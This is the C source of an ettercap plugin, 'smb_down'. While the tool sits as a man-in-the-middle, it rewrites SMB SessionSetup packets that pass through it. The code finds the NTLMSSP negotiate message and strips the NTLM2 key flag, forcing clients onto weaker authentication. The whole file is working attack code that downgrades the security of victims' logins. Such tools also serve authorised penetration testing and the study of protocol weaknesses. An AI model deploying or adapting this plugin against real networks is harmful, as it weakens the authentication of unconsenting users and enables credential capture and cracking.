/*
    smb_down -- ettercap plugin -- Tries to force no NTLM2 key

    Copyright (C) ALoR & NaGA
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/


#include <ec.h>                        /* required for global variables */
#include <ec_plugins.h>                /* required for plugin ops */
#include <ec_packet.h>
#include <ec_hook.h>


typedef struct {
   u_char  proto[4];
   u_char  cmd;
   u_char  err[4];
   u_char  flags1;
   u_short flags2;
   u_short pad[6];
   u_short tid, pid, uid, mid;
} SMB_header;

typedef struct {
   u_char  mesg;
   u_char  flags;
   u_short len;
} NetBIOS_header;

#define NTLM2_KEY 0x00000800

/* protos */
int plugin_load(void *);
static int smb_down_init(void *);
static int smb_down_fini(void *);

static void parse_smb(struct packet_object *po);

/* plugin operations */

struct plugin_ops smb_down_ops = { 
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version =  EC_VERSION,                        
   /* the name of the plugin */
   .name =              "smb_down",  
    /* a short description of the plugin (max 50 chars) */                    
   .info =              "Tries to force SMB to not use NTLM2 key auth",  
   /* the plugin version. */ 
   .version =           "1.0",   
   /* activation function */
   .init =              &smb_down_init,
   /* deactivation function */                     
   .fini =              &smb_down_fini,
};

/**********************************************************/

/* this function is called on plugin load */
int plugin_load(void *handle) 
{
   return plugin_register(handle, &smb_down_ops);
}

/******************* STANDARD FUNCTIONS *******************/

static int smb_down_init(void *dummy) 
{
   /* It doesn't work if unoffensive */
   if (GBL_OPTIONS->unoffensive) {
      INSTANT_USER_MSG("smb_down: plugin doesn't work in UNOFFENSIVE mode\n");
      return PLUGIN_FINISHED;
   }

   USER_MSG("smb_down: plugin running...\n");
   
   hook_add(HOOK_PROTO_SMB_CHL, &parse_smb);
   return PLUGIN_RUNNING;   
}


static int smb_down_fini(void *dummy) 
{
   USER_MSG("smb_down: plugin terminated...\n");

   hook_del(HOOK_PROTO_SMB_CHL, &parse_smb);
   return PLUGIN_FINISHED;
}

/*********************************************************/

/* Clear the encryption bit in the SecurityModel request */
static void parse_smb(struct packet_object *po)
{
   SMB_header *smb;
   NetBIOS_header *NetBIOS;
   u_char *ptr;
   u_int32 *Flags;
   char tmp[MAX_ASCII_ADDR_LEN];
   
   /* It is pointless to modify packets that won't be forwarded */
   if (!(po->flags & PO_FORWARDABLE)) 
      return; 
      
   /* Catch netbios and smb headers */
   NetBIOS = (NetBIOS_header *)po->DATA.data;
   smb = (SMB_header *)(NetBIOS + 1);
   /* Let's go to the data */
   ptr = (u_char *)(smb + 1);

   /* According to the Hook Point we are sure that this is
    * a SessionSetup request packet.
    * Let's check if it's NTLMSSP_NEGOTIATE
    */
    ptr += ( (*ptr) * 2 + 3 );
    if ( (ptr = memmem(ptr, 128, "NTLMSSP", 8)) == NULL) 
       return;
       
    ptr = (u_char*)strchr((char*)ptr, 0);
    ptr++;

    /* NTLMSSP_NEGOTIATE */	  
    if (*ptr != 1)
       return;
    ptr+=4; 
    /* Catch the flags */
    Flags = (u_int32 *)ptr;
    
    if (*Flags & ntohl(NTLM2_KEY)) {
       *Flags ^= ntohl(NTLM2_KEY); 
       USER_MSG("smb_down: Forced no NTLM2 key  %s -> ", ip_addr_ntoa(&po->L3.src, tmp));
       USER_MSG("%s\n", ip_addr_ntoa(&po->L3.dst, tmp));
       po->flags |= PO_MODIFIED;
    }
}

/* EOF */

// vim:ts=3:expandtab
 
